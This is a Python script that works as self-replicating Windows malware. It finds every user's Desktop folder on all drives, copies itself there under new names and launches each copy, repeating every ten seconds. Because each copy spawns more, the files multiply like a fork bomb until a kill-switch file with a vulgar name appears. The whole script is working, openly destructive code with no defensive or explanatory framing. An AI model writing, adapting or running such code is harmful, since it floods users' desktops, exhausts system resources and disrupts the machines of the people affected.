import os
from sys import argv
import psutil
from shutil import copy
import time
import subprocess

def search_dir(dir, name):
    found = False

    try:
        objects = os.scandir(dir)
    except WindowsError:
        return found

    for item in objects:
        if item.name == name:
            found = True

    objects.close()
    return found


def scan_dir(dir, type):
    objects = os.scandir(dir)
    all_items = []

    for item in objects:
        if type == "Directories":
            if item.is_dir():
                all_items.append(dir + item.name)
        elif type == "Files":
            if item.is_file():
                all_items.append(dir + item.name)
        elif type == "Both":
            if item.is_dir() or item.is_file:
                all_items.append(dir + item.name)
        else:
            print("Invalid type!")

    objects.close()
    return all_items


def duplicate(directories, num, num_duplicates):
    scriptDir = str(argv[0])
    scriptName = os.path.basename(__file__)

    for dir in directories:
        for i in range(0, num):
            copy(scriptDir, dir)

            flag = False
            j = i + num_duplicates - 1
            while not flag:
                try:
                    os.rename(dir + "\\" + scriptName, dir + "\\" + str(j) + scriptName)
                    subprocess.run(dir + "\\" + str(j) + scriptName)
                    flag = True
                except:
                    j += 1

    if num_duplicates == 1:
        num_duplicates += 2
    else:
        num_duplicates += 3

    return num_duplicates


attackDirectories = []
numOfDups = 1

disk_partitions = psutil.disk_partitions()
for disk in disk_partitions:
    root = str(disk[0])

    if search_dir(root, "Users"):
        user_directories = scan_dir(root + "Users\\", "Directories")

        if len(user_directories) > 0:
            for dir in user_directories:
                if search_dir(dir, "Desktop") and dir != root + "Users\\All Users":
                    attackDirectories.append(dir + "\\Desktop")

print(attackDirectories)
while not search_dir(os.getcwd(), "stfu.cunt"):
    time.sleep(10)
    numOfDups = duplicate(attackDirectories, 3, numOfDups)




